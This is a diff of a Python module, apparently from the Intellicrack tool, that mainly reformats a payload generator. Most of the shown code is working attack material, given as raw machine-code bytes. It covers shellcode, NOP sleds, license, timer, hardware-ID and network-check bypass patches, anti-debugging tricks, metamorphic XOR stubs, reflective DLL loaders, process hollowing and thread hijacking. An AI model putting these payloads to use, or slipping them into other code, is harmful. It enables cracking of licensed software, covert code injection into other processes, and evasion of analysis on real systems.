@@ -1,5 +1,4 @@
-"""
-Advanced Payload Generation Module
+"""Advanced Payload Generation Module
 
 Copyright (C) 2025 Zachary Flint
 
@@ -23,7 +22,7 @@ along with Intellicrack.  If not, see <https://www.gnu.org/licenses/>.
 import logging
 import random
 import traceback
-from typing import Any, Dict, Optional
+from typing import Any
 
 from ...utils.logger import get_logger
 
@@ -39,8 +38,7 @@ except ImportError as e:
     keystone = None
 
 class PayloadGenerator:
-    """
-    Basic payload generator for creating patches and shellcode.
+    """Basic payload generator for creating patches and shellcode.
     """
 
     def __init__(self):
@@ -53,26 +51,26 @@ class PayloadGenerator:
         self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
 
     def generate_nop_sled(self, length: int) -> bytes:
-        """
-        Generate a NOP sled of specified length.
+        """Generate a NOP sled of specified length.
 
         Args:
             length: Length of NOP sled in bytes
 
         Returns:
             bytes: NOP sled
+
         """
         return b"\x90" * length
 
-    def generate_simple_payload(self, payload_type: str) -> Optional[bytes]:
-        """
-        Generate a simple payload of the specified type.
+    def generate_simple_payload(self, payload_type: str) -> bytes | None:
+        """Generate a simple payload of the specified type.
 
         Args:
             payload_type: Type of payload to generate
 
         Returns:
             Optional[bytes]: Generated payload or None if type not supported
+
         """
         payloads = {
             "ret_1": b"\xb8\x01\x00\x00\x00\xc3",  # mov eax, 1; ret
@@ -83,8 +81,7 @@ class PayloadGenerator:
         return payloads.get(payload_type)
 
     def generate(self, payload_type: str, **kwargs) -> bytes:
-        """
-        Generate exploit payload based on type and parameters.
+        """Generate exploit payload based on type and parameters.
 
         This method provides comprehensive payload generation for various exploitation
         scenarios including shellcode, ROP chains, code caves, and bypass techniques.
@@ -95,6 +92,7 @@ class PayloadGenerator:
 
         Returns:
             bytes: Generated exploit payload ready for injection
+
         """
         self.logger.info(f"Generating payload of type: {payload_type}")
 
@@ -125,7 +123,7 @@ class PayloadGenerator:
             # Protection removal
             "remove_timer": self._generate_timer_removal,
             "remove_hwid": self._generate_hwid_removal,
-            "remove_network": self._generate_network_removal
+            "remove_network": self._generate_network_removal,
         }
 
         # Get the appropriate generator
@@ -155,11 +153,10 @@ class PayloadGenerator:
         if arch == "x86":
             # x86: push address; ret
             return b"\x68" + address.to_bytes(4, "little") + b"\xc3"
-        elif arch == "x64":
+        if arch == "x64":
             # x64: movabs rax, address; jmp rax
             return b"\x48\xb8" + address.to_bytes(8, "little") + b"\xff\xe0"
-        else:
-            return b""
+        return b""
 
     def _generate_jmp_address(self, **kwargs) -> bytes:
         """Generate jump to address payload."""
@@ -173,12 +170,10 @@ class PayloadGenerator:
             if -2147483648 <= offset <= 2147483647:
                 # Near jump
                 return b"\xe9" + offset.to_bytes(4, "little", signed=True)
-            else:
-                # Far jump via register
-                if arch == "x86":
-                    return b"\xb8" + address.to_bytes(4, "little") + b"\xff\xe0"
-                else:
-                    return b"\x48\xb8" + address.to_bytes(8, "little") + b"\xff\xe0"
+            # Far jump via register
+            if arch == "x86":
+                return b"\xb8" + address.to_bytes(4, "little") + b"\xff\xe0"
+            return b"\x48\xb8" + address.to_bytes(8, "little") + b"\xff\xe0"
         return b""
 
     def _generate_shellcode(self, **kwargs) -> bytes:
@@ -204,14 +199,13 @@ class PayloadGenerator:
                 b"\x64\x2e\x89\xe3\x53\x53\xff\xd0\x83\xc4\x08\x31\xc9"
                 b"\x51\xff\xd0"
             )
-        elif shellcode_type == "msgbox":
+        if shellcode_type == "msgbox":
             # Windows x86 MessageBoxA
             return (
                 b"\x31\xd2\x52\x68\x48\x65\x6c\x6c\x68\x6f\x20\x57\x6f"
                 b"\x72\x6c\x64\x21\x00\x89\xe1\x52\x51\x51\x52\xff\xd0"
             )
-        else:
-            return b"\x90" * 16  # NOP sled as fallback
+        return b"\x90" * 16  # NOP sled as fallback
 
     def _generate_reverse_shell(self, **kwargs) -> bytes:
         """Generate reverse shell payload."""
@@ -243,14 +237,13 @@ class PayloadGenerator:
         if bypass_type == "return_true":
             # x86: mov eax, 1; ret
             return b"\xb8\x01\x00\x00\x00\xc3"
-        elif bypass_type == "skip_check":
+        if bypass_type == "skip_check":
             # x86: jmp past check (short jump)
             return b"\xeb" + kwargs.get("skip_bytes", 10).to_bytes(1, "little")
-        elif bypass_type == "patch_comparison":
+        if bypass_type == "patch_comparison":
             # x86: xor eax, eax (make comparison always equal)
             return b"\x31\xc0\x90\x90\x90"
-        else:
-            return b"\x90\x90\x90\x90\x90"
+        return b"\x90\x90\x90\x90\x90"
 
     def _generate_auth_bypass(self, **kwargs) -> bytes:
         """Generate authentication bypass payload."""
@@ -264,14 +257,13 @@ class PayloadGenerator:
         if check_type == "crc":
             # Bypass CRC check
             return b"\x31\xc0\x40\xc3"  # xor eax, eax; inc eax; ret
-        elif check_type == "signature":
+        if check_type == "signature":
             # Bypass signature check
             return b"\xb8\x01\x00\x00\x00\xc3"
-        elif check_type == "integrity":
+        if check_type == "integrity":
             # Bypass integrity check
             return b"\x31\xc9\x41\x89\xc8\xc3"
-        else:
-            return b"\x90\x90\x90\x90"
+        return b"\x90\x90\x90\x90"
 
     def _generate_rop_chain(self, **kwargs) -> bytes:
         """Generate ROP chain payload."""
@@ -310,11 +302,10 @@ class PayloadGenerator:
         if hook_type == "iat":
             # IAT hook bypass
             return b"\xe9\x00\x00\x00\x00"  # jmp to original
-        elif hook_type == "inline":
+        if hook_type == "inline":
             # Inline hook bypass
             return kwargs.get("original_bytes", b"\x90" * 5)
-        else:
-            return b"\x90" * 5
+        return b"\x90" * 5
 
     def _generate_anti_debug(self, **kwargs) -> bytes:
         """Generate anti-debugging bypass payload."""
@@ -323,11 +314,10 @@ class PayloadGenerator:
         if technique == "peb":
             # Clear PEB BeingDebugged flag
             return b"\x64\xa1\x30\x00\x00\x00\x80\x40\x02\x00\xc3"
-        elif technique == "ntglobalflag":
+        if technique == "ntglobalflag":
             # Clear NtGlobalFlag
             return b"\x64\xa1\x30\x00\x00\x00\x83\x60\x68\x00\xc3"
-        else:
-            return b"\x90\x90\x90\x90"
+        return b"\x90\x90\x90\x90"
 
     def _generate_timer_removal(self, **kwargs) -> bytes:
         """Generate timer check removal payload."""
@@ -340,25 +330,20 @@ class PayloadGenerator:
             if bypass_method == "zero_time":
                 # Return zero for time checks (x64)
                 return b"\x48\x31\xc0\xc3"  # xor rax, rax; ret
-            elif bypass_method == "current_time":
+            if bypass_method == "current_time":
                 # Return current time + large offset (x64)
                 return b"\x48\xb8\xff\xff\xff\x7f\x00\x00\x00\x00\xc3"  # mov rax, 0x7fffffff; ret
-            else:
-                # Max time value (x64)
-                return b"\x48\xb8\xff\xff\xff\xff\xff\xff\xff\x7f\xc3"  # mov rax, 0x7fffffffffffffff; ret
-        else:
-            # x86 implementation
-            if preserve_registers:
-                # Preserve registers with push/pop
-                if bypass_method == "zero_time":
-                    return b"\x50\x31\xc0\x58\xc3"  # push eax; xor eax, eax; pop eax; ret
-                else:
-                    return b"\x50\xb8\xff\xff\xff\x7f\x58\xc3"  # push eax; mov eax, 0x7fffffff; pop eax; ret
-            else:
-                if bypass_method == "zero_time":
-                    return b"\x31\xc0\xc3"  # xor eax, eax; ret
-                else:
-                    return b"\xb8\xff\xff\xff\x7f\xc3"  # mov eax, 0x7fffffff; ret
+            # Max time value (x64)
+            return b"\x48\xb8\xff\xff\xff\xff\xff\xff\xff\x7f\xc3"  # mov rax, 0x7fffffffffffffff; ret
+        # x86 implementation
+        if preserve_registers:
+            # Preserve registers with push/pop
+            if bypass_method == "zero_time":
+                return b"\x50\x31\xc0\x58\xc3"  # push eax; xor eax, eax; pop eax; ret
+            return b"\x50\xb8\xff\xff\xff\x7f\x58\xc3"  # push eax; mov eax, 0x7fffffff; pop eax; ret
+        if bypass_method == "zero_time":
+            return b"\x31\xc0\xc3"  # xor eax, eax; ret
+        return b"\xb8\xff\xff\xff\x7f\xc3"  # mov eax, 0x7fffffff; ret
 
     def _generate_hwid_removal(self, **kwargs) -> bytes:
         """Generate hardware ID check removal payload."""
@@ -372,35 +357,29 @@ class PayloadGenerator:
             if bypass_method == "fake_hwid":
                 # Return fake but valid-looking HWID (x64)
                 return b"\x48\xb8\x12\x34\x56\x78\x9a\xbc\xde\xf0\xc3"  # mov rax, 0xf0debc9a78563412; ret
-            elif bypass_method == "null_hwid":
+            if bypass_method == "null_hwid":
                 # Return null HWID (x64)
                 return b"\x48\x31\xc0\xc3"  # xor rax, rax; ret
-            else:
-                # Return success (x64)
-                return b"\x48\x31\xc0\x48\xff\xc0\xc3"  # xor rax, rax; inc rax; ret
-        else:
-            # x86 implementation
-            if preserve_stack:
-                # Preserve stack with proper alignment
-                if bypass_method == "fake_hwid":
-                    return b"\x50\xb8\x12\x34\x56\x78\x58\xc3"  # push eax; mov eax, 0x78563412; pop eax; ret
-                elif bypass_method == "null_hwid":
-                    return b"\x50\x31\xc0\x58\xc3"  # push eax; xor eax, eax; pop eax; ret
-                else:
-                    return b"\x50\x31\xc0\x40\x58\xc3"  # push eax; xor eax, eax; inc eax; pop eax; ret
-            else:
-                if bypass_method == "fake_hwid":
-                    # Return predictable fake HWID based on type
-                    if hwid_type == "cpu":
-                        return b"\xb8\x68\x69\x6e\x74\xc3"  # mov eax, "hint"; ret (Intel signature)
-                    elif hwid_type == "mac":
-                        return b"\xb8\x00\x1b\x21\x12\xc3"  # mov eax, fake MAC; ret
-                    else:
-                        return b"\xb8\x12\x34\x56\x78\xc3"  # mov eax, 0x78563412; ret
-                elif bypass_method == "null_hwid":
-                    return b"\x31\xc0\xc3"  # xor eax, eax; ret
-                else:
-                    return b"\x31\xc0\x40\xc3"  # xor eax, eax; inc eax; ret
+            # Return success (x64)
+            return b"\x48\x31\xc0\x48\xff\xc0\xc3"  # xor rax, rax; inc rax; ret
+        # x86 implementation
+        if preserve_stack:
+            # Preserve stack with proper alignment
+            if bypass_method == "fake_hwid":
+                return b"\x50\xb8\x12\x34\x56\x78\x58\xc3"  # push eax; mov eax, 0x78563412; pop eax; ret
+            if bypass_method == "null_hwid":
+                return b"\x50\x31\xc0\x58\xc3"  # push eax; xor eax, eax; pop eax; ret
+            return b"\x50\x31\xc0\x40\x58\xc3"  # push eax; xor eax, eax; inc eax; pop eax; ret
+        if bypass_method == "fake_hwid":
+            # Return predictable fake HWID based on type
+            if hwid_type == "cpu":
+                return b"\xb8\x68\x69\x6e\x74\xc3"  # mov eax, "hint"; ret (Intel signature)
+            if hwid_type == "mac":
+                return b"\xb8\x00\x1b\x21\x12\xc3"  # mov eax, fake MAC; ret
+            return b"\xb8\x12\x34\x56\x78\xc3"  # mov eax, 0x78563412; ret
+        if bypass_method == "null_hwid":
+            return b"\x31\xc0\xc3"  # xor eax, eax; ret
+        return b"\x31\xc0\x40\xc3"  # xor eax, eax; inc eax; ret
 
     def _generate_network_removal(self, **kwargs) -> bytes:
         """Generate network check removal payload."""
@@ -414,34 +393,29 @@ class PayloadGenerator:
             if bypass_method == "simulate_online":
                 # Simulate successful network connection (x64)
                 return b"\x48\xb8\x01\x00\x00\x00\x00\x00\x00\x00\xc3"  # mov rax, 1; ret
-            elif bypass_method == "force_offline":
+            if bypass_method == "force_offline":
                 # Force offline mode success (x64)
                 return b"\x48\xb8\x02\x00\x00\x00\x00\x00\x00\x00\xc3"  # mov rax, 2; ret
-            else:
-                # Generic success (x64)
-                return b"\x48\xb8\x01\x00\x00\x00\x00\x00\x00\x00\xc3"  # mov rax, 1; ret
-        else:
-            # x86 implementation
-            if simulate_connection:
-                # Simulate network responses based on type
-                if network_type == "license_server":
-                    return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret (license available)
-                elif network_type == "activation_server":
-                    return b"\xb8\x02\x00\x00\x00\xc3"  # mov eax, 2; ret (activation success)
-                elif network_type == "validation_server":
-                    return b"\xb8\x03\x00\x00\x00\xc3"  # mov eax, 3; ret (validation passed)
-                else:
-                    return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret (generic success)
-            else:
-                if bypass_method == "force_offline":
-                    # Return offline mode success
-                    return b"\xb8\x02\x00\x00\x00\xc3"  # mov eax, 2; ret
-                elif bypass_method == "fake_connection":
-                    # Fake successful connection
-                    return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret
-                else:
-                    # Default network bypass
-                    return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret
+            # Generic success (x64)
+            return b"\x48\xb8\x01\x00\x00\x00\x00\x00\x00\x00\xc3"  # mov rax, 1; ret
+        # x86 implementation
+        if simulate_connection:
+            # Simulate network responses based on type
+            if network_type == "license_server":
+                return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret (license available)
+            if network_type == "activation_server":
+                return b"\xb8\x02\x00\x00\x00\xc3"  # mov eax, 2; ret (activation success)
+            if network_type == "validation_server":
+                return b"\xb8\x03\x00\x00\x00\xc3"  # mov eax, 3; ret (validation passed)
+            return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret (generic success)
+        if bypass_method == "force_offline":
+            # Return offline mode success
+            return b"\xb8\x02\x00\x00\x00\xc3"  # mov eax, 2; ret
+        if bypass_method == "fake_connection":
+            # Fake successful connection
+            return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret
+        # Default network bypass
+        return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret
 
     def _generate_generic_payload(self, **kwargs) -> bytes:
         """Generate generic payload when specific type not found."""
@@ -452,8 +426,7 @@ class PayloadGenerator:
 
 
 class AdvancedPayloadGenerator:
-    """
-    Sophisticated payload generation for exploit strategies
+    """Sophisticated payload generation for exploit strategies
     """
 
     def __init__(self):
@@ -461,8 +434,7 @@ class AdvancedPayloadGenerator:
         self.logger = get_logger(f"{__name__}.{self.__class__.__name__}")
 
     def generate(self, payload_type: str, **kwargs) -> bytes:
-        """
-        Generate advanced exploit payload.
+        """Generate advanced exploit payload.
 
         This method provides sophisticated payload generation for complex exploitation
         scenarios including multi-stage payloads, encrypted shellcode, polymorphic code,
@@ -474,6 +446,7 @@ class AdvancedPayloadGenerator:
 
         Returns:
             bytes: Generated advanced exploit payload
+
         """
         self.logger.info(f"Generating advanced payload of type: {payload_type}")
 
@@ -512,7 +485,7 @@ class AdvancedPayloadGenerator:
             "anti_vm": self._generate_anti_vm_payload,
             "anti_sandbox": self._generate_anti_sandbox_payload,
             "anti_debugger_advanced": self._generate_advanced_anti_debug,
-            "anti_forensics": self._generate_anti_forensics_payload
+            "anti_forensics": self._generate_anti_forensics_payload,
         }
 
         # Get the appropriate generator
@@ -562,10 +535,8 @@ class AdvancedPayloadGenerator:
                 ret
                 """
                 return self._assemble_x86_64(asm_code) or b"\xb8\x01\x00\x00\x00\xc3"
-            else:
-                return b"\xb8\x01\x00\x00\x00\xc3"
-        else:
-            return b"\x31\xc0\x40\xc3"
+            return b"\xb8\x01\x00\x00\x00\xc3"
+        return b"\x31\xc0\x40\xc3"
 
     def _generate_multi_layer_bypass(self, **kwargs) -> bytes:
         """Generate multi-layer protection bypass payload."""
@@ -688,48 +659,47 @@ class AdvancedPayloadGenerator:
                     b"\x58"                      # pop rax
                     b"\x90" * 16                 # payload space
                 )
+        # x86 metamorphic engine
+        elif mutation_complexity == "advanced":
+            # Build x86 metamorphic stub with dynamic values
+            metamorphic_stub = (
+                b"\x60"                      # pushad
+                b"\x8b\x3c\x24"              # mov edi, [esp]
+                b"\x83\xc7\x40"              # add edi, 0x40
+            )
+            metamorphic_stub += b"\xb9" + payload_size.to_bytes(4, "little")  # mov ecx, payload_size
+            metamorphic_stub += b"\xb8" + mutation_key.to_bytes(4, "little")  # mov eax, mutation_key
+            metamorphic_stub += (
+                b"\x31\x07"                  # xor [edi], eax
+                b"\x47"                      # inc edi
+                b"\xe2\xfa"                  # loop
+                b"\x61"                      # popad
+            ) + b"\x90" * payload_size       # payload space
+        elif mutation_complexity == "simple":
+            metamorphic_stub = (
+                b"\x60"                      # pushad
+                b"\x8b\x3c\x24"              # mov edi, [esp]
+                b"\x83\xc7\x20"              # add edi, 0x20
+                b"\xb9\x08\x00\x00\x00"      # mov ecx, 0x08
+                b"\x90"                      # nop (placeholder for mutation)
+                b"\x47"                      # inc edi
+                b"\xe2\xfc"                  # loop
+                b"\x61"                      # popad
+                b"\x90" * 8                  # payload space
+            )
         else:
-            # x86 metamorphic engine
-            if mutation_complexity == "advanced":
-                # Build x86 metamorphic stub with dynamic values
-                metamorphic_stub = (
-                    b"\x60"                      # pushad
-                    b"\x8b\x3c\x24"              # mov edi, [esp]
-                    b"\x83\xc7\x40"              # add edi, 0x40
-                )
-                metamorphic_stub += b"\xb9" + payload_size.to_bytes(4, "little")  # mov ecx, payload_size
-                metamorphic_stub += b"\xb8" + mutation_key.to_bytes(4, "little")  # mov eax, mutation_key
-                metamorphic_stub += (
-                    b"\x31\x07"                  # xor [edi], eax
-                    b"\x47"                      # inc edi
-                    b"\xe2\xfa"                  # loop
-                    b"\x61"                      # popad
-                ) + b"\x90" * payload_size       # payload space
-            elif mutation_complexity == "simple":
-                metamorphic_stub = (
-                    b"\x60"                      # pushad
-                    b"\x8b\x3c\x24"              # mov edi, [esp]
-                    b"\x83\xc7\x20"              # add edi, 0x20
-                    b"\xb9\x08\x00\x00\x00"      # mov ecx, 0x08
-                    b"\x90"                      # nop (placeholder for mutation)
-                    b"\x47"                      # inc edi
-                    b"\xe2\xfc"                  # loop
-                    b"\x61"                      # popad
-                    b"\x90" * 8                  # payload space
-                )
-            else:
-                # Basic metamorphic engine
-                metamorphic_stub = (
-                    b"\x60"                      # pushad
-                    b"\x8b\x3c\x24"              # mov edi, [esp]
-                    b"\x83\xc7\x20"              # add edi, 0x20
-                    b"\xb9\x10\x00\x00\x00"      # mov ecx, 0x10
-                    b"\x31\xc0"                  # xor eax, eax
-                    b"\xaa"                      # stosb
-                    b"\xe2\xfd"                  # loop
-                    b"\x61"                      # popad
-                    b"\x90" * 16                 # payload space
-                )
+            # Basic metamorphic engine
+            metamorphic_stub = (
+                b"\x60"                      # pushad
+                b"\x8b\x3c\x24"              # mov edi, [esp]
+                b"\x83\xc7\x20"              # add edi, 0x20
+                b"\xb9\x10\x00\x00\x00"      # mov ecx, 0x10
+                b"\x31\xc0"                  # xor eax, eax
+                b"\xaa"                      # stosb
+                b"\xe2\xfd"                  # loop
+                b"\x61"                      # popad
+                b"\x90" * 16                 # payload space
+            )
 
         return metamorphic_stub
 
@@ -762,14 +732,14 @@ class AdvancedPayloadGenerator:
             if use_api_hashing:
                 # More sophisticated loader with API hashing
                 return (
-                    b"\x55" +                     # push rbp
-                    b"\x48\x89\xe5" +             # mov rbp, rsp
-                    b"\x53" +                     # push rbx
-                    b"\x56" +                     # push rsi
-                    b"\x57" +                     # push rdi
-                    b"\x48\x83\xec\x20" +         # sub rsp, 0x20
-                    b"\xe8\x00\x00\x00\x00" +     # call $+5
-                    b"\x59" +                     # pop rcx
+                    b"\x55"                     # push rbp
+                    b"\x48\x89\xe5"             # mov rbp, rsp
+                    b"\x53"                     # push rbx
+                    b"\x56"                     # push rsi
+                    b"\x57"                     # push rdi
+                    b"\x48\x83\xec\x20"         # sub rsp, 0x20
+                    b"\xe8\x00\x00\x00\x00"     # call $+5
+                    b"\x59"                     # pop rcx
                     b"\x48\x81\xe9" + dll_base_offset.to_bytes(4, "little") +  # sub rcx, dll_base_offset
                     b"\x48\x8d\xb1" + entry_point_offset.to_bytes(4, "little") +  # lea rsi, [rcx+entry_point_offset]
                     b"\xff\xd6" +                 # call rsi
@@ -780,69 +750,66 @@ class AdvancedPayloadGenerator:
                     b"\x5d" +                     # pop rbp
                     b"\xc3"                       # ret
                 )
-            else:
-                # Basic 64-bit loader
-                return (
-                    b"\x55" +                     # push rbp
-                    b"\x48\x89\xe5" +             # mov rbp, rsp
-                    b"\x53" +                     # push rbx
-                    b"\xe8\x00\x00\x00\x00" +     # call $+5
-                    b"\x5b" +                     # pop rbx
-                    b"\x48\x81\xeb" + dll_base_offset.to_bytes(4, "little") +  # sub rbx, dll_base_offset
-                    b"\x48\x8d\xb3" + entry_point_offset.to_bytes(4, "little") +  # lea rsi, [rbx+entry_point_offset]
-                    b"\xff\xd6" +                 # call rsi
-                    b"\x5b" +                     # pop rbx
-                    b"\x5d" +                     # pop rbp
-                    b"\xc3"                       # ret
-                )
-        else:
-            # x86 reflective DLL loader
-            if use_api_hashing:
-                # Enhanced x86 loader with API hashing
-                dll_base_bytes = dll_base_offset.to_bytes(4, "little")
-                entry_point_bytes = entry_point_offset.to_bytes(4, "little")
-                loader = (
-                    b"\x55" +                     # push ebp
-                    b"\x89\xe5" +                 # mov ebp, esp
-                    b"\x53" +                     # push ebx
-                    b"\x57" +                     # push edi
-                    b"\x56" +                     # push esi
-                    b"\xe8\x00\x00\x00\x00" +     # call $+5
-                    b"\x5b" +                     # pop ebx
-                    b"\x81\xeb" + dll_base_bytes + # sub ebx, dll_base_offset
-                    b"\x8d\xb3" + entry_point_bytes + # lea esi, [ebx+entry_point_offset]
-                    b"\x6a\x00" +                 # push 0 (API hashing context)
-                    b"\xff\xd6" +                 # call esi
-                    b"\x83\xc4\x04" +             # add esp, 4
-                    b"\x5e" +                     # pop esi
-                    b"\x5f" +                     # pop edi
-                    b"\x5b" +                     # pop ebx
-                    b"\x5d" +                     # pop ebp
-                    b"\xc3"                       # ret
-                )
-                return loader
-            else:
-                # Basic x86 loader
-                dll_base_bytes = dll_base_offset.to_bytes(4, "little")
-                entry_point_bytes = entry_point_offset.to_bytes(4, "little")
-                loader = (
-                    b"\x55" +                     # push ebp
-                    b"\x89\xe5" +                 # mov ebp, esp
-                    b"\x53" +                     # push ebx
-                    b"\x57" +                     # push edi
-                    b"\x56" +                     # push esi
-                    b"\xe8\x00\x00\x00\x00" +     # call $+5
-                    b"\x5b" +                     # pop ebx
-                    b"\x81\xeb" + dll_base_bytes + # sub ebx, dll_base_offset
-                    b"\x8d\xb3" + entry_point_bytes + # lea esi, [ebx+entry_point_offset]
-                    b"\xff\xd6" +                 # call esi
-                    b"\x5e" +                     # pop esi
-                    b"\x5f" +                     # pop edi
-                    b"\x5b" +                     # pop ebx
-                    b"\x5d" +                     # pop ebp
-                    b"\xc3"                       # ret
-                )
-                return loader
+            # Basic 64-bit loader
+            return (
+                b"\x55"                     # push rbp
+                b"\x48\x89\xe5"             # mov rbp, rsp
+                b"\x53"                     # push rbx
+                b"\xe8\x00\x00\x00\x00"     # call $+5
+                b"\x5b"                     # pop rbx
+                b"\x48\x81\xeb" + dll_base_offset.to_bytes(4, "little") +  # sub rbx, dll_base_offset
+                b"\x48\x8d\xb3" + entry_point_offset.to_bytes(4, "little") +  # lea rsi, [rbx+entry_point_offset]
+                b"\xff\xd6" +                 # call rsi
+                b"\x5b" +                     # pop rbx
+                b"\x5d" +                     # pop rbp
+                b"\xc3"                       # ret
+            )
+        # x86 reflective DLL loader
+        if use_api_hashing:
+            # Enhanced x86 loader with API hashing
+            dll_base_bytes = dll_base_offset.to_bytes(4, "little")
+            entry_point_bytes = entry_point_offset.to_bytes(4, "little")
+            loader = (
+                b"\x55"                     # push ebp
+                b"\x89\xe5"                 # mov ebp, esp
+                b"\x53"                     # push ebx
+                b"\x57"                     # push edi
+                b"\x56"                     # push esi
+                b"\xe8\x00\x00\x00\x00"     # call $+5
+                b"\x5b"                     # pop ebx
+                b"\x81\xeb" + dll_base_bytes + # sub ebx, dll_base_offset
+                b"\x8d\xb3" + entry_point_bytes + # lea esi, [ebx+entry_point_offset]
+                b"\x6a\x00" +                 # push 0 (API hashing context)
+                b"\xff\xd6" +                 # call esi
+                b"\x83\xc4\x04" +             # add esp, 4
+                b"\x5e" +                     # pop esi
+                b"\x5f" +                     # pop edi
+                b"\x5b" +                     # pop ebx
+                b"\x5d" +                     # pop ebp
+                b"\xc3"                       # ret
+            )
+            return loader
+        # Basic x86 loader
+        dll_base_bytes = dll_base_offset.to_bytes(4, "little")
+        entry_point_bytes = entry_point_offset.to_bytes(4, "little")
+        loader = (
+            b"\x55"                     # push ebp
+            b"\x89\xe5"                 # mov ebp, esp
+            b"\x53"                     # push ebx
+            b"\x57"                     # push edi
+            b"\x56"                     # push esi
+            b"\xe8\x00\x00\x00\x00"     # call $+5
+            b"\x5b"                     # pop ebx
+            b"\x81\xeb" + dll_base_bytes + # sub ebx, dll_base_offset
+            b"\x8d\xb3" + entry_point_bytes + # lea esi, [ebx+entry_point_offset]
+            b"\xff\xd6" +                 # call esi
+            b"\x5e" +                     # pop esi
+            b"\x5f" +                     # pop edi
+            b"\x5b" +                     # pop ebx
+            b"\x5d" +                     # pop ebp
+            b"\xc3"                       # ret
+        )
+        return loader
 
     def _generate_process_hollowing(self, **kwargs) -> bytes:
         """Generate process hollowing payload."""
@@ -857,9 +824,9 @@ class AdvancedPayloadGenerator:
         if arch == "x64":
             # x64 process hollowing shellcode
             hollowing_code = (
-                b"\x48\x83\xec\x28" +             # sub rsp, 0x28
-                b"\x48\x31\xc9" +                 # xor rcx, rcx
-                b"\x48\x31\xd2" +                 # xor rdx, rdx
+                b"\x48\x83\xec\x28"             # sub rsp, 0x28
+                b"\x48\x31\xc9"                 # xor rcx, rcx
+                b"\x48\x31\xd2"                 # xor rdx, rdx
                 b"\x41\xb8" + creation_flags +     # mov r8d, creation_flags
                 b"\x41\xb9\x00\x00\x00\x00" +     # mov r9d, 0
                 b"\xff\x15\x02\x00\x00\x00" +     # call [CreateProcessA]
@@ -876,13 +843,13 @@ class AdvancedPayloadGenerator:
         else:
             # x86 process hollowing shellcode
             hollowing_code = (
-                b"\x55" +                         # push ebp
-                b"\x89\xe5" +                     # mov ebp, esp
-                b"\x83\xec\x10" +                 # sub esp, 0x10
-                b"\x6a\x00" +                     # push 0 (CREATE_SUSPENDED if suspend_threads)
-                b"\x6a\x00" +                     # push 0
-                b"\x6a\x00" +                     # push 0
-                b"\x6a\x00" +                     # push 0
+                b"\x55"                         # push ebp
+                b"\x89\xe5"                     # mov ebp, esp
+                b"\x83\xec\x10"                 # sub esp, 0x10
+                b"\x6a\x00"                     # push 0 (CREATE_SUSPENDED if suspend_threads)
+                b"\x6a\x00"                     # push 0
+                b"\x6a\x00"                     # push 0
+                b"\x6a\x00"                     # push 0
                 b"\x68" + target_process.encode()[:4].ljust(4, b"\x00") +  # push target_process
                 b"\xff\x15\x00\x00\x00\x00" +     # call [CreateProcessA]
                 b"\x50" +                         # push eax (process handle)
@@ -908,7 +875,7 @@ class AdvancedPayloadGenerator:
         if arch == "x64":
             # x64 thread hijacking shellcode
             hijack_code = (
-                b"\x48\x83\xec\x28" +             # sub rsp, 0x28
+                b"\x48\x83\xec\x28"             # sub rsp, 0x28
                 b"\x48\xb9" + target_pid.to_bytes(8, "little") +  # mov rcx, target_pid
                 b"\x48\xba\x01\x00\x1f\x00" +     # mov rdx, PROCESS_ALL_ACCESS
                 b"\x41\xb8\x00\x00\x00\x00" +     # mov r8d, 0 (inherit handle)
@@ -927,11 +894,11 @@ class AdvancedPayloadGenerator:
         else:
             # x86 thread hijacking shellcode
             hijack_code = (
-                b"\x55" +                         # push ebp
-                b"\x89\xe5" +                     # mov ebp, esp
-                b"\x83\xec\x10" +                 # sub esp, 0x10
-                b"\x68\x01\x00\x1f\x00" +         # push PROCESS_ALL_ACCESS
-                b"\x6a\x00" +                     # push 0 (inherit handle)
+                b"\x55"                         # push ebp
+                b"\x89\xe5"                     # mov ebp, esp
+                b"\x83\xec\x10"                 # sub esp, 0x10
+                b"\x68\x01\x00\x1f\x00"         # push PROCESS_ALL_ACCESS
+                b"\x6a\x00"                     # push 0 (inherit handle)
                 b"\x68" + target_pid.to_bytes(4, "little") +  # push target_pid
                 b"\xff\x15\x00\x00\x00\x00" +     # call [OpenProcess]
                 b"\x50" +                         # push eax (process handle)
@@ -969,7 +936,7 @@ class AdvancedPayloadGenerator:
     def _generate_advanced_rop_chain(self, **kwargs) -> bytes:
         """Generate advanced ROP chain with gadget chaining."""
         gadgets = kwargs.get("gadgets", [])
-        stack_pivot = kwargs.get("stack_pivot", None)
+        stack_pivot = kwargs.get("stack_pivot")
 
         chain = b""
 
@@ -1016,25 +983,24 @@ class AdvancedPayloadGenerator:
                         chain += b"\xff\xe1"  # jmp rcx
                     else:
                         chain += b"\xff\xe2"  # jmp rdx
-        else:
-            # x86 JOP gadgets
-            if gadget_type == "jmp_indirect":
-                for i in range(chain_length):
-                    if i < len(target_addresses):
-                        addr = target_addresses[i].to_bytes(4, "little")
-                    else:
-                        addr = (0x00400000 + i * 4).to_bytes(4, "little")
-                    chain += b"\xff\x25" + addr  # jmp dword ptr [addr]
-            elif gadget_type == "jmp_reg":
-                for i in range(chain_length):
-                    if i % 4 == 0:
-                        chain += b"\xff\xe0"  # jmp eax
-                    elif i % 4 == 1:
-                        chain += b"\xff\xe1"  # jmp ecx
-                    elif i % 4 == 2:
-                        chain += b"\xff\xe2"  # jmp edx
-                    else:
-                        chain += b"\xff\xe3"  # jmp ebx
+        # x86 JOP gadgets
+        elif gadget_type == "jmp_indirect":
+            for i in range(chain_length):
+                if i < len(target_addresses):
+                    addr = target_addresses[i].to_bytes(4, "little")
+                else:
+                    addr = (0x00400000 + i * 4).to_bytes(4, "little")
+                chain += b"\xff\x25" + addr  # jmp dword ptr [addr]
+        elif gadget_type == "jmp_reg":
+            for i in range(chain_length):
+                if i % 4 == 0:
+                    chain += b"\xff\xe0"  # jmp eax
+                elif i % 4 == 1:
+                    chain += b"\xff\xe1"  # jmp ecx
+                elif i % 4 == 2:
+                    chain += b"\xff\xe2"  # jmp edx
+                else:
+                    chain += b"\xff\xe3"  # jmp ebx
 
         return chain
 
@@ -1102,11 +1068,10 @@ class AdvancedPayloadGenerator:
         if technique == "info_leak":
